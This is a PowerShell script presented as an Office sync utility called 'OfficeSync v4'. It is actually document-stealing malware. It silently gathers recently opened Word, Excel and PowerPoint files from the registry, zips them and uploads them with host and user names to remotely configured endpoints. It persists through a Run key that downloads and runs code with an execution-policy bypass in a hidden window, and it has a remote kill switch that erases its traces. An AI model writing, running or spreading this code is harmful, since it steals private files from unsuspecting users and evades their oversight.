# OfficeSync v4
$ErrorActionPreference='SilentlyContinue'
$ProgressPreference='SilentlyContinue'
Add-Type -AssemblyName System.IO.Compression.FileSystem
Add-Type -AssemblyName System.Net.Http

$cfgUrl='https://raw.githubusercontent.com/Capyvests/office-demmo/refs/heads/main/config.txt'
$estado='HKCU:\Software\OfficeSync'
$ext='.docx','.doc','.docm','.pptx','.ppt','.pptm','.xlsx','.xls'

if(-not(Test-Path $estado)){New-Item -Path $estado -Force|Out-Null}

function Estado($n,$v){
  if($PSBoundParameters.ContainsKey('v')){Set-ItemProperty -Path $estado -Name $n -Value $v}
  else{(Get-ItemProperty -Path $estado -Name $n -ErrorAction SilentlyContinue).$n}
}

function NaJanela($i,$f,$h){
  if($i -eq $f){return $true}
  if($i -lt $f){return ($h -ge $i -and $h -lt $f)}
  return ($h -ge $i -or $h -lt $f)
}

function Buscar($u){
  try{
    $wc=New-Object Net.WebClient
    $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
    $wc.DownloadString("$u`?t=$([DateTime]::UtcNow.Ticks)")
  }catch{return $null}
}

function Enviar($zip,$meta,$url){
  try{
    $cli=New-Object Net.Http.HttpClient
    $mp=New-Object Net.Http.MultipartFormDataContent
    $fs=[IO.File]::OpenRead($zip)
    $mp.Add((New-Object Net.Http.StreamContent($fs)),'files[0]',[IO.Path]::GetFileName($zip))
    $pc=New-Object Net.Http.StringContent($meta)
    $pc.Headers.ContentType=[Net.Http.Headers.MediaTypeHeaderValue]::Parse('application/json')
    $mp.Add($pc,'payload_json')
    $r=$cli.PostAsync($url,$mp).Result
    $fs.Close(); $cli.Dispose()
    return [int]$r.StatusCode
  }catch{return 0}
}

function EnviarFallback($zip,$meta,$url){
  try{
    Invoke-WebRequest -Uri $url -Method Post -InFile $zip -ContentType 'application/zip' `
      -Headers @{'X-Host'=$env:COMPUTERNAME;'X-User'=$env:USERNAME} `
      -UseBasicParsing -TimeoutSec 30 | Out-Null
    return 200
  }catch{return 0}
}

$cfg=$null
while($true){
  $novo=$null
  $bruto=Buscar $cfgUrl
  if($bruto){
    $limpo=($bruto -split "`n" | Where-Object {$_ -match '='}) -join "`n"
    if($limpo){$novo=$limpo|ConvertFrom-StringData}
  }
  if($novo){$cfg=$novo;Estado 'versao' $cfg.versao}
  if(-not $cfg){Start-Sleep 60;continue}

  $int=[int]$cfg.intervalo; if($int -lt 10){$int=10}

  if([int]$cfg.destruir -eq 1){
    try{Invoke-WebRequest -Uri $cfg.endpoint -Method Post -Body 'estado=destruido' -UseBasicParsing -TimeoutSec 10|Out-Null}catch{}
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OfficeSync' -ErrorAction SilentlyContinue
    Remove-Item -Path $estado -Recurse -Force -ErrorAction SilentlyContinue
    exit
  }

  $hora=(Get-Date).Hour
  $envios=[int](Estado 'envios')
  $max=[int]$cfg.max_envios
  $passa=([int]$cfg.ativo -eq 1) -and (NaJanela ([int]$cfg.hora_inicio) ([int]$cfg.hora_fim) $hora) -and ($max -eq 0 -or $envios -lt $max)
  if(-not $passa){Start-Sleep -Seconds $int;continue}

  $out=Join-Path $env:TEMP ('ofs_'+(Get-Random))
  New-Item -ItemType Directory -Path $out -Force|Out-Null

  $paths=@()
  foreach($v in '16.0','15.0','14.0'){
    foreach($a in 'Word','PowerPoint','Excel'){
      $k="HKCU:\Software\Microsoft\Office\$v\$a\File MRU"
      if(Test-Path $k){
        $o=Get-ItemProperty $k
        $o.PSObject.Properties.Name|Where-Object{$_ -like 'Item*'}|ForEach-Object{
          $paths+=(($o.$_ -split '\*')[-1]).Trim()
        }
      }
    }
  }
  $paths=$paths|Where-Object{
      $_ -and ($ext -contains [IO.Path]::GetExtension($_).ToLower()) -and (Test-Path $_)
    }|Select-Object -Unique

  $sel=@(); $total=0
  foreach($p in $paths){
    if($sel.Count -ge 10){break}
    $tam=(Get-Item -LiteralPath $p).Length
    if($total+$tam -gt 8MB){continue}
    $total+=$tam; $sel+=$p
  }
  $paths=$sel

  if($paths.Count -gt 0){
    foreach($x in $paths){Copy-Item -LiteralPath $x -Destination $out -Force}
    $zip=Join-Path $env:TEMP ('ofs_'+(Get-Random)+'.zip')
    [IO.Compression.ZipFile]::CreateFromDirectory($out,$zip)
    $meta='{"content":"'+$env:COMPUTERNAME+' / '+$env:USERNAME+' / ciclo '+($envios+1)+'"}'
    $ok=Enviar $zip $meta $cfg.endpoint
    if($ok -eq 0 -and $cfg.endpoint2){$ok=EnviarFallback $zip $meta $cfg.endpoint2}
    if($ok -gt 0){Estado 'envios' ($envios+1);Estado 'ultimo' (Get-Date).ToString('s')}
    Remove-Item $zip -Force
  }
  Remove-Item $out -Recurse -Force

  $cmd='cmd /c curl.exe -s -o "%TEMP%\o.ps1" "{0}" && powershell -w h -nop -ni -ep bypass -f "%TEMP%\o.ps1"' -f $cfgUrl
  Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OfficeSync' -Value $cmd

  Start-Sleep -Seconds $int
}
